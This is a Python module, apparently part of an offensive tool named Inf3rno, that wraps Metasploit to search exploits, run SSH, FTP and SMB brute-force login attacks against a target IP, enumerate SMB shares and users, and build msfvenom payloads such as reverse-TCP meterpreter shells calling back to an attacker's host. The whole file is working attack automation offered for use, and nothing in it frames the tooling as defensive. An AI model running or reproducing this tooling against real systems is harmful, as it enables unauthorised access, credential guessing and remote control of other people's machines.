"""Metasploit integration module for Inf3rno."""

import os
import subprocess
import json
from typing import List, Dict, Optional


class MetasploitIntegration:
    """Metasploit integration for advanced exploitation."""

    def __init__(self):
        self.msfconsole_path = self._find_msfconsole()
        self.msfvenom_path = self._find_msfvenom()

    def _find_msfconsole(self) -> Optional[str]:
        """Find msfconsole executable path."""
        try:
            result = subprocess.run(
                ["which", "msfconsole"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass

        common_paths = [
            "/usr/bin/msfconsole",
            "/usr/local/bin/msfconsole",
            "/opt/metasploit-framework/bin/msfconsole",
        ]
        for path in common_paths:
            if os.path.exists(path):
                return path

        return None

    def _find_msfvenom(self) -> Optional[str]:
        """Find msfvenom executable path."""
        try:
            result = subprocess.run(
                ["which", "msfvenom"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass

        common_paths = [
            "/usr/bin/msfvenom",
            "/usr/local/bin/msfvenom",
            "/opt/metasploit-framework/bin/msfvenom",
        ]
        for path in common_paths:
            if os.path.exists(path):
                return path

        return None

    def is_available(self) -> bool:
        """Check if Metasploit is available."""
        return self.msfconsole_path is not None

    def check_version(self) -> Dict:
        """Check Metasploit version."""
        if not self.is_available():
            return {"error": "Metasploit not found"}

        try:
            result = subprocess.run(
                [self.msfconsole_path, "--version"],
                capture_output=True,
                text=True,
                timeout=10,
            )
            return {"version": result.stdout.strip()}
        except Exception as e:
            return {"error": str(e)}

    def search_exploits(self, keyword: str) -> List[Dict]:
        """
        Search for exploits by keyword.

        Args:
            keyword: Search term (e.g., "ssh", "smb", "http")

        Returns:
            List of matching exploits
        """
        if not self.is_available():
            return []

        try:
            cmd = f"search {keyword}"
            result = subprocess.run(
                [self.msfconsole_path, "-q", "-x", f"{cmd}; exit"],
                capture_output=True,
                text=True,
                timeout=30,
            )

            exploits = []
            for line in result.stdout.split("\n"):
                if line.startswith("exploit/"):
                    parts = line.split()
                    if len(parts) >= 2:
                        exploits.append({
                            "path": parts[0],
                            "name": parts[1] if len(parts) > 1 else "",
                            "rank": parts[2] if len(parts) > 2 else "",
                            "description": " ".join(parts[3:]) if len(parts) > 3 else "",
                        })

            return exploits

        except Exception as e:
            return [{"error": str(e)}]

    def search_auxiliary(self, keyword: str) -> List[Dict]:
        """
        Search for auxiliary modules.

        Args:
            keyword: Search term

        Returns:
            List of matching auxiliary modules
        """
        if not self.is_available():
            return []

        try:
            cmd = f"search type:auxiliary {keyword}"
            result = subprocess.run(
                [self.msfconsole_path, "-q", "-x", f"{cmd}; exit"],
                capture_output=True,
                text=True,
                timeout=30,
            )

            modules = []
            for line in result.stdout.split("\n"):
                if line.startswith("auxiliary/"):
                    parts = line.split()
                    if len(parts) >= 2:
                        modules.append({
                            "path": parts[0],
                            "name": parts[1] if len(parts) > 1 else "",
                            "rank": parts[2] if len(parts) > 2 else "",
                            "description": " ".join(parts[3:]) if len(parts) > 3 else "",
                        })

            return modules

        except Exception as e:
            return [{"error": str(e)}]

    def run_ssh_bruteforce(self, target: str, port: int = 22,
                           user_file: str = None, pass_file: str = None) -> Dict:
        """
        Run SSH brute-force using Metasploit.

        Args:
            target: Target IP
            port: SSH port
            user_file: Username file
            pass_file: Password file

        Returns:
            Results dictionary
        """
        if not self.is_available():
            return {"error": "Metasploit not found"}

        module = "auxiliary/scanner/ssh/ssh_login"

        options = {
            "RHOSTS": target,
            "RPORT": str(port),
            "THREADS": "5",
        }

        if user_file:
            options["USER_FILE"] = user_file
        if pass_file:
            options["PASS_FILE"] = pass_file

        return self._run_module(module, options)

    def run_ftp_bruteforce(self, target: str, port: int = 21,
                           user_file: str = None, pass_file: str = None) -> Dict:
        """
        Run FTP brute-force using Metasploit.

        Args:
            target: Target IP
            port: FTP port
            user_file: Username file
            pass_file: Password file

        Returns:
            Results dictionary
        """
        if not self.is_available():
            return {"error": "Metasploit not found"}

        module = "auxiliary/scanner/ftp/ftp_login"

        options = {
            "RHOSTS": target,
            "RPORT": str(port),
            "THREADS": "5",
        }

        if user_file:
            options["USER_FILE"] = user_file
        if pass_file:
            options["PASS_FILE"] = pass_file

        return self._run_module(module, options)

    def run_smb_bruteforce(self, target: str, port: int = 445,
                           user_file: str = None, pass_file: str = None) -> Dict:
        """
        Run SMB brute-force using Metasploit.

        Args:
            target: Target IP
            port: SMB port
            user_file: Username file
            pass_file: Password file

        Returns:
            Results dictionary
        """
        if not self.is_available():
            return {"error": "Metasploit not found"}

        module = "auxiliary/scanner/smb/smb_login"

        options = {
            "RHOSTS": target,
            "RPORT": str(port),
            "THREADS": "5",
        }

        if user_file:
            options["USER_FILE"] = user_file
        if pass_file:
            options["PASS_FILE"] = pass_file

        return self._run_module(module, options)

    def run_ssh_version(self, target: str, port: int = 22) -> Dict:
        """
        Detect SSH version.

        Args:
            target: Target IP
            port: SSH port

        Returns:
            Version information
        """
        if not self.is_available():
            return {"error": "Metasploit not found"}

        module = "auxiliary/scanner/ssh/ssh_version"

        options = {
            "RHOSTS": target,
            "RPORT": str(port),
        }

        return self._run_module(module, options)

    def run_ftp_version(self, target: str, port: int = 21) -> Dict:
        """
        Detect FTP version.

        Args:
            target: Target IP
            port: FTP port

        Returns:
            Version information
        """
        if not self.is_available():
            return {"error": "Metasploit not found"}

        module = "auxiliary/scanner/ftp/ftp_version"

        options = {
            "RHOSTS": target,
            "RPORT": str(port),
        }

        return self._run_module(module, options)

    def run_smb_enum(self, target: str, port: int = 445) -> Dict:
        """
        Enumerate SMB shares and users.

        Args:
            target: Target IP
            port: SMB port

        Returns:
            Enumeration results
        """
        if not self.is_available():
            return {"error": "Metasploit not found"}

        results = {}

        # Enum shares
        shares = self._run_module(
            "auxiliary/scanner/smb/smb_enumshares",
            {"RHOSTS": target, "RPORT": str(port)}
        )
        results["shares"] = shares

        # Enum users
        users = self._run_module(
            "auxiliary/scanner/smb/smb_enumusers",
            {"RHOSTS": target, "RPORT": str(port)}
        )
        results["users"] = users

        return results

    def run_http_version(self, target: str, port: int = 80) -> Dict:
        """
        Detect HTTP server version.

        Args:
            target: Target IP
            port: HTTP port

        Returns:
            Version information
        """
        if not self.is_available():
            return {"error": "Metasploit not found"}

        module = "auxiliary/scanner/http/http_version"

        options = {
            "RHOSTS": target,
            "RPORT": str(port),
        }

        return self._run_module(module, options)

    def generate_payload(self, payload_type: str, lhost: str, lport: int,
                         format: str = "raw") -> Dict:
        """
        Generate payload using msfvenom.

        Args:
            payload_type: Payload type (e.g., "windows/meterpreter/reverse_tcp")
            lhost: Local host for callback
            lport: Local port for callback
            format: Output format (raw, exe, python, etc.)

        Returns:
            Generated payload info
        """
        if not self.msfvenom_path:
            return {"error": "msfvenom not found"}

        try:
            cmd = [
                self.msfvenom_path,
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                return {"error": result.stderr}

            return {
                "payload": payload_type,
                "lhost": lhost,
                "lport": lport,
                "format": format,
                "size": len(result.stdout),
            }

        except Exception as e:
            return {"error": str(e)}

    def _run_module(self, module: str, options: Dict) -> Dict:
        """Run a Metasploit module."""
        try:
            # Build command
            commands = [f"use {module}"]
            for key, value in options.items():
                commands.append(f"set {key} {value}")
            commands.append("run")
            commands.append("exit")

            cmd_str = "; ".join(commands)

            result = subprocess.run(
                [self.msfconsole_path, "-q", "-x", cmd_str],
                capture_output=True,
                text=True,
                timeout=60,
            )

            # Parse output
            output = result.stdout
            success_indicators = ["Login Successful", "logged in", "success"]
            failed_indicators = ["Login Failed", "failed", "invalid"]

            found = []
            for line in output.split("\n"):
                if any(indicator.lower() in line.lower() for indicator in success_indicators):
                    found.append(line.strip())

            return {
                "module": module,
                "options": options,
                "output": output,
                "found": found,
                "success": len(found) > 0,
            }

        except subprocess.TimeoutExpired:
            return {"error": "Module execution timed out"}
        except Exception as e:
            return {"error": str(e)}


# Global instance
metasploit_integration = MetasploitIntegration()
